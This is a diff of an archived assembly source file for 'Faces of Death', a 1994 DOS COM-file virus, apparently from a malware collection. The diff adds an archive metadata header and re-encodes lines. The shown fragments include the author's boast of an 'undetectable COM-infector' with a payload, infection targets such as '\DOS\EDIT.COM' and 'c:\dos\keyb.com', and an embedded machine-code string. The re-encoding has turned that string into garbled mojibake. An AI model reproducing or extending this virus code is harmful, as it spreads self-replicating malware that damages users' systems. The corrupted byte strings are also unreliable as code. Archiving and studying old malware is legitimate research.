@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      F
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ; ------------------------------------------------------------------------------
 ;
 ;                       - Faces of Death -
@@ -5,7 +16,7 @@
 ;              (c) 1994 The Unforgiven/Immortal Riot 
 ;
 ; ------------------------------------------------------------------------------
-;         þ Undetectable COM-infector(s) with a neat pay-load system! þ
+;         ï¿½ Undetectable COM-infector(s) with a neat pay-load system! ï¿½
 ; ------------------------------------------------------------------------------
 .model tiny
 .radix 16
@@ -232,7 +243,7 @@ v_name           db   "Faces of Death - (c) 1994 The Unforgiven/Immortal Riot$"
 direct_infect    db      '\DOS\EDIT.COM',0                         
 file_create      db      'c:\dos\keyb.com',0
 
-write            db      "þJ€ÄNºJÍ!s´,Í!€úOr°¹
+write            db      "ï¿½Jï¿½ï¿½Nï¿½Jï¿½!sï¿½,ï¿½!ï¿½ï¿½Orï¿½ï¿½
 endwrite:                
 
 len              equ     endwrite-write
